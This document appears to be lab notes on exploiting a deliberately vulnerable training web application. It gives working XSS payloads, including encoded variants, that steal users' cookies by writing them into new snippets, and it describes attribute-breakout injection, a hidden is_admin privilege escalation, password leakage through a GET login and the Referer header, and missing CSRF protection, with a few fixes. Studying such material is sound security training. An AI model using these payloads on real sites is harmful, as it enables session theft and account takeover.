# Snippets

Makes a new snippet with "x" as the contents:

```html
<b onmouseover='javascript:window.location.href="newsnippet2?snippet=x"'>bet you can't click me</b>
```

Makes a new snippet that writes the users cookie:

```html
<b onmouseover='javascript:window.location.href="newsnippet2?snippet="+document.cookie'>you can't click this, can you?</b>
```

```html
<img src=x onerror='alert(&quot;xss&quot;)'>
```

```js
exfil=document.createElement("img");
exfil.src="newsnippet2?snippet="+document.cookie;
document.appendChild(exfil);
```

```text
<img src=x onerror='eval("exfil=document.createElement(\"img\");exfil.src=\"newsnippet2?snippet=\"+document.cookie;document.body.appendChild(exfil);")'>
```

```text
gotcha!+%3Cimg+src%3Dx+onerror%3D%27eval%28%22exfil%3Ddocument%2EcreateElement%28%5C%22img%5C%22%29%3Bexfil%2Esrc%3D%5C%22newsnippet2%3Fsnippet%3D%5C%22%2Bdocument%2Ecookie%3Bdocument%2Ebody%2EappendChild%28exfil%29%3B%22%29%27%3E
```


# Profile:

### Profile Color

Need to break out of `style='{color}'` context.

### Homepage

Not restricted to actual URL, can set to `%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E` for stored XSS.

Sanitization is weak (just `<>&"`), so to simply attach some onclick javascript:

```text
' onclick='eval("exfil=document.createElement(\"img\");exfil.src=\"newsnippet2?snippet=\"+document.cookie;document.body.appendChild(exfil);")'
```

To use the "error page" reflection vulnerability:

```text
<script>exfil=document.createElement("img");exfil.src="newsnippet2?snippet="+document.cookie;document.body.appendChild(exfil);</script>
```

double-uri-encode (including dots) to:

```
%253Cscript%253Eexfil%253Ddocument%252EcreateElement%2528%2522img%2522%2529%253Bexfil%252Esrc%253D%2522newsnippet2%253Fsnippet%253D%2522%252Bdocument%252Ecookie%253Bdocument%252Ebody%252EappendChild%2528exfil%2529%253B%253C%252Fscript%253E
```


### Admin

Hidden `is_admin=True` grants admin privilege
- show how to use ZAP to intercept and modify request (or, even Firefox tools to add hidden input)
- alternative is to brute-force the prefixed checksum
- defense: only use stored property, not the query property

# Login

Login is `GET` and password remains displayed in the address bar.  Referer leaks password!


# General

Reflected XSS on error message "page not found", e.g. `/:id/%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E`

- fix is to edit `resources/error.gtl` to append `:text` to the message template-slot

No CSRF protection anywhere.

`feed.gtl` is public, reveals UIDs.
- also vulnerable to stored XSS that exploits JSONP


